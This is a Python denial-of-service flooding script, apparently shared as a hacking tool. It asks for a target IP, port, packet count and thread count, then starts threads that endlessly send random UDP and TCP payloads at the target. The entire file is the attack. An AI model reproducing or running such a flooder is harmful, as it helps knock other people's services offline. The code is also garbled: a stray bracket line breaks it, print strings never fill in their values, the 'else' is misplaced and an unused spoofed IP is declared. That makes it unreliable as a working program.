#!/usr/bin/env python3
#Code by AxeL
import struct
import time
import random
import socket
import threading
import os
import time
import sys

os.system("clear")
print("""
\033[94m
   _   _     _              ___  ____  
 | \ | | __| | __ _  __ _ / _ \|  _ \ 
 |  \| |/ _` |/ _` |/ _` | | | | |_) |
 | |\  | (_| | (_| | (_| | |_| |  __/ 
 |_| \_|\__,_|\__,_|\__, |\___/|_|    
                    |___/             
               Tools By AxeL
""")

ip = str(input("\033[95m=====> + IP Target    : "))
port = int(input("=====> + PORT Target  : "))
times = int(input("=====> $ Send PACKETS : "))
threads = int(input("=====> $ Send THREADS : "))
choice = str(input("=====> × Ready? (y/n) : "))
fake_ip = '182.21.20.32'

                       ]
def run():
	data = random._urandom(17)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[96m AxeLOREZ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(1042)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[96m AxeLOREZ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
		except:
			s.close()
			print("[*] Error")
def run3():
	data = random._urandom(1042)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[96m AxeLOREZ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
else:
		th = threading.Thread(target = run3)
		th.start()
